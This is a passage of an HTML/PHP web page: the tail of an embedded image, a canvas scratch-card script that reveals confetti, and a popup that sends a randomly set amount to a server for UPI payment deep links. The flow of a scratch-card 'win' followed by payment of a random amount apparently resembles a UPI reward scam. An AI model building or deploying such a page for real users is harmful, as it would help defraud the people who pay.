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";
        image.onload = function () {
            ctx.drawImage(image, 0, 0);
            document.querySelectorAll('.form')[0].style.visibility = 'visible';
        };
         brush.src = 'data:image/png;base64,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'; // truncated for readability; original preserved in your real file


            canvas.addEventListener('mousedown', handleMouseDown, false);
            canvas.addEventListener('touchstart', handleMouseDown, false);
            canvas.addEventListener('mousemove', handleMouseMove, false);
            canvas.addEventListener('touchmove', handleMouseMove, false);
            canvas.addEventListener('mouseup', handleMouseUp, false);
            canvas.addEventListener('touchend', handleMouseUp, false);

            function distanceBetween(point1, point2) {
                return Math.sqrt(Math.pow(point2.x - point1.x, 2) + Math.pow(point2.y - point1.y, 2));
            }

            function angleBetween(point1, point2) {
                return Math.atan2(point2.x - point1.x, point2.y - point1.y);
            }

            function getFilledInPixels(stride) {
                if (!stride || stride < 1) {
                    stride = 1;
                }
                var pixels = ctx.getImageData(0, 0, canvasWidth, canvasHeight),
                    pdata = pixels.data,
                    l = pdata.length,
                    total = (l / stride),
                    count = 0;
                for (var i = count = 0; i < l; i += stride) {
                    if (parseInt(pdata[i]) === 0) {
                        count++;
                    }
                }
                return Math.round((count / total) * 100);
            }

            function getMouse(e, canvas) {
                var offsetX = 0,
                    offsetY = 0,
                    mx, my;
                if (canvas.offsetParent !== undefined) {
                    do {
                        offsetX += canvas.offsetLeft;
                        offsetY += canvas.offsetTop;
                    } while ((canvas = canvas.offsetParent));
                }
                mx = (e.pageX || (e.touches && e.touches[0].clientX)) - offsetX;
                my = (e.pageY || (e.touches && e.touches[0].clientY)) - offsetY;
                return {
                    x: mx,
                    y: my
                };
            }

            function handlePercentage(filledInPixels) {
                filledInPixels = filledInPixels || 0;
                if (filledInPixels > 40) {
                    if (canvas && canvas.parentNode) canvas.parentNode.removeChild(canvas);
                    var elems = document.getElementsByClassName("confetti");
                    for (var i = 0; i < elems.length; i++) {
                        elems[i].style.visibility = 'visible';
                    }
                }
            }

            function handleMouseDown(e) {
                isDrawing = true;
                lastPoint = getMouse(e, canvas);
            }

            function handleMouseMove(e) {
                if (!isDrawing) return;
                e.preventDefault();
                var currentPoint = getMouse(e, canvas),
                    dist = distanceBetween(lastPoint, currentPoint),
                    angle = angleBetween(lastPoint, currentPoint),
                    x, y;
                for (var i = 0; i < dist; i++) {
                    x = lastPoint.x + (Math.sin(angle) * i) - 25;
                    y = lastPoint.y + (Math.cos(angle) * i) - 25;
                    ctx.globalCompositeOperation = 'destination-out';
                    ctx.drawImage(brush, x, y);
                }
                lastPoint = currentPoint;
                handlePercentage(getFilledInPixels(32));
            }

            function handleMouseUp(e) {
                isDrawing = false;
            }
        })();
    </script>

    <script>
        // Popup controls
        const payLinks = document.querySelectorAll('.pay-link');
        const popupOverlay = document.getElementById('popupOverlay');
        const closePopup = document.getElementById('closePopup');
        const paymentMethods = document.querySelectorAll('.popup img');

        payLinks.forEach((link) => {
            link.addEventListener('click', (e) => {
                e.preventDefault();
                // store the price in localStorage so payNow() can use it
                localStorage.setItem('price', '<?php echo $random_amount; ?>');
                popupOverlay.style.display = 'flex';
            });
        });

        if (closePopup) {
            closePopup.addEventListener('click', () => {
                popupOverlay.style.display = 'none';
            });
        }

        paymentMethods.forEach((method) => {
            method.addEventListener('click', () => {
                // clicking handled by inline onclick that calls payNow
                // fallback: if element has data-link, follow it
                const link = method.getAttribute('data-link');
                if (link) window.location.href = link;
            });
        });
    </script>


    <script>
        /**
         * payNow - calls create_payment.php which returns a deep link for the requested payType
         * upi_address - string
         * payType - 'phonepe' | 'paytm' | 'gpay' | 'bhim_upi'
         * minAmount, maxAmount - strings/numbers from PHP
         */
        async function payNow(upi_address, payType, minAmount, maxAmount) {
            try {
                // try to get amount; fall back to PHP amount if needed
                var amt = localStorage.getItem("price") || window.__PHP_AMOUNT || String(minAmount || 1);
                // convert to numeric string
                amt = String(Number(amt));

                // send amount + payType + upi + min/max for server-side validation/clamping
                const res = await fetch('create_payment.php', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        amount: amt,
                        payType: payType,
                        upi: upi_address,
                        min_amount: String(minAmount),
                        max_amount: String(maxAmount)
                    })
                });

                if (!res.ok) {
                    const errText = await res.text().catch(() => null);
                    alert('Server error: ' + (errText || res.statusText));
                    return;
                }

                const json = await res.json();
                if (json && json.redirect_url) {
                    // navigate to deep link returned by server
                    window.location.href = json.redirect_url;
                } else {
                    alert('Unexpected server response. Check console.');
                    console.error(json);
                }
            } catch (err) {
                console.error(err);
                alert('Network or server error.');
            }
        }
    </script>
</body>

</html>